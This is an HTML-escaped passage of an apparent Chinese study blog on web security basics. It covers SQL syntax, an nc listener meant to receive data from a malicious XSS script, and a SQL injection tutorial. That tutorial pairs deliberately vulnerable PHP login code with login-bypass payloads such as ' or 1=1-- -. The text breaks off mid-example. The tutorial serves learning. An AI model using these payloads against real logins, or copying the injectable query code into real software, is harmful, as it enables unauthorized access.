&lt;span class=&quot;k&quot;&gt;insert&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;values&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;insert&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;values&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;abc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;666666&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;-- 查询某个表&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- 利用where进行查询&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- where的感觉就好像是做一个判断, 结果为真时就输出&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;-- order by &amp;lt;row_number&amp;gt; 可以排序&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- 下面的就是用第一列排序输出&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;order&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;by&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;-- union 命令可以合并select的结果&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;-- 默认会合并相同的值, union all不会合并&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;column_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;table1&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;column_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;table2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- 为数据库设置密码&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PASSWORD&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FOR&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PASSWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在表里面, 有一些特殊的表: 比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;information_schema&lt;/code&gt;, 就是一个保存了数据库信息的表,&lt;/p&gt;

&lt;p&gt;感觉这个的逻辑是这样的, 一个&lt;strong&gt;数据库系统&lt;/strong&gt;里面有很多的&lt;strong&gt;数据库&lt;/strong&gt;, 
进入数据库中后有很多的&lt;strong&gt;数据表&lt;/strong&gt;, 一个数据表通过表头来形成很多的列, 
在列里面有放着很多的信息.&lt;/p&gt;

&lt;h3 id=&quot;杂项技术&quot;&gt;杂项技术&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;监听的方式  &lt;br /&gt;
假如说有一个服务器在运行, 然后在服务器上可以监听特定端口上的访问信息, 
比如说&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 80&lt;/code&gt;就是监听&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;端口的信息.  &lt;br /&gt;
比如说可以设置一个恶意的XSS脚本, 让用户把自己的信息用请求的方式发送给监听的服务器, 
于是监听的服务器就会知道发生了什么了.&lt;/li&gt;
  &lt;li&gt;调试前段javascript  &lt;br /&gt;
(因为我用的是Safari, 所以可能又一些不一样, 但是一般来说, 基本的功能都是一样的, 
并且据说看英文都能懂, 实在不行就查文档. )
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;Elements&lt;/strong&gt; 面板, 可以看到最终的用于渲染的html代码&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt; 面板, 和Elements面板里面的内容不一样的是, 
Source面板就是网页服务器发送过来的, 还没有执行过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt;之类的东西的代码  &lt;br /&gt;
并且还可以在里面设置断点, 因为游览器得到source的代码之后, 
还要先进行一波的js代码处理(得到Elements里的东西), 这样以后才会真正进行渲染显示, 
所以在source里面设置断点, 可以看到js的一个执行过程的思路.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Console&lt;/strong&gt; 面板, 在里面可以进行js代码的测试&lt;/li&gt;
      &lt;li&gt;其他的还没用到过.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h2&gt;
&lt;p&gt;SQL注入, 核心的思想就是针对数据库查询的时候, 由于查询的输入被做了手脚, 
导致查询的结果出现了问题.&lt;/p&gt;

&lt;p&gt;看&lt;a href=&quot;https://ucasers.cn/SQL注入手册/&quot;&gt;学长的网页总结&lt;/a&gt;, 我的基本上就是学长的copy, 
不过写了一些自己对代码的理解.&lt;/p&gt;

&lt;h3 id=&quot;example&quot;&gt;Example&lt;/h3&gt;
&lt;p&gt;假如有一个网站的源码是这样的:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 设置一些信息&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 连接刚刚经过处理的MySQL数据库&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$dbusername&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$dbpassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 假定有一个数据库叫做test&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//   create database test; &lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$dbname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysqli_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dbusername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dbpassword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 设置数据库字符集&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mysqli_set_charset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'UTF-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

    &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 这里有三种方法来查询数据库信息&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT id, username, password FROM user WHERE username='&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' and password='&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$passwd&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' LIMIT 0,1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// $query = 'SELECT id, username, password FROM user WHERE username=&quot;$name&quot; and password=&quot;$passwd&quot; LIMIT 0,1';&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// $query = &quot;SELECT id, username, password FROM user WHERE username=('$name') and password=('$passwd') LIMIT 0,1&quot;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// 这个的判定是只要数据库查询信息有返回值, 那么就视为登陆成功&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//   mysqli_fetch_array(): &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     Returns an array representing the fetched row, &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     `null' if there are no more rows in the result set, &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//     or `false' on failure.&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_fetch_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Login Succeeded!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Login Failed!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mysqli_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对于第一种查询策略: 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$query = &quot;SELECT id, username, password FROM user WHERE username='$name' and password='$passwd' LIMIT 0,1&quot;;&lt;/code&gt;, 
可以发现, 这个做的就是一个变量替换的过程, 然后一个思路就是利用变量替换, 
构造出长得不太合理的查询命令, 最终达到让自己随心所欲的目的.&lt;/p&gt;

&lt;p&gt;比如简单的&lt;strong&gt;万能密码&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=a'%20or%201=1-- -&lt;/code&gt;, 这样的输入就会让查询的语句变成: 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT id, username, password FROM user WHERE username='a' or 1=1-- -' and password='' LIMIT 0,1&lt;/code&gt;, 
相当于是把后面的东西给注释了, 并且用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;or 1=1&lt;/code&gt;让&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;where&lt;/code&gt;的判断始终为真, 
就一定会有输入了. 改成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?password=a'%20or%201=1-- -&lt;/code&gt;也行的.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=admin'-- -&lt;/code&gt;, 这样的输入适合那些知道一部分信息的攻击方法, 查询语句为: 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT id, username, password FROM user WHERE username='admin'-- -' and password='' LIMIT 0,1&lt;/code&gt;, 
注释掉了一半, 确定的部分还是可以输出的.&lt;/li&gt;
  &lt;li&gt;同样的原理也可以用: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=admin'/*&amp;amp;passwd=*/-- -&lt;/code&gt;, 
相当于是把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;注释掉了, 这个适用于知道参数查询位置的攻击. 
虽然不确定好不好用.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上面的方法就是手工制作注入的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;playload&lt;/code&gt;, 或者可以通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlmap&lt;/code&gt;这个程序来自动尝试, 
(虽然一般是会有限制的). &lt;a href=&quot;https://sqlmap.org&quot;&gt;项目网址&lt;/a&gt;. 
(并且我还没怎么用过, 所以不太清楚. )&lt;/p&gt;

&lt;p&gt;然后剩下两种感觉是异曲同工的, 只要把上面的单引号的形式换一换就行了, 
比如第二种查询方式: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=admin&quot;-- -&lt;/code&gt;, 第三种&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?name=admin')-- -&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;然后一个绕弯的地方就是, 在后面的注释里面, 不是简单的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt;而已, 而是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-- -&lt;/code&gt;, 
这个原因是为了防止程序把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt;理解成减去一个负数的意思. 比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 = --1&lt;/code&gt;, 
因为理解成了算数运算, 所以不是注释. (所以最后一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt;可以换成任意字符的样子. )&lt;/p&gt;

&lt;h3 id=&quot;一般步骤&quot;&gt;一般步骤&lt;/h3&gt;
&lt;p&gt;换一个例子:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
    &lt;span class=&quot;c1&quot;&gt;// 连接刚刚经过处理的MySQL数据库&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$dbusername&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$dbpassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$dbname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysqli_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dbusername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dbpassword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mysqli_set_charset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'UTF-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 设置数据库字符集&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 只查询了用户名, 说明只有用户名这里存在注入点&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT id, username, password FROM user where username = '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
    
    &lt;span class=&quot;nv&quot;&gt;$obj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mysqli_fetch_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 下面的操作能够成立的一个原因就是这个var_dump把查询的数据返回输出了, &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//   所以才能够看得比较清楚&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 逻辑是通过查询用户名, 比较密码和用户输入的是否相等&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'passwd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;Null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'passwd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;Null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Login Succeeded!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Login Failed!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
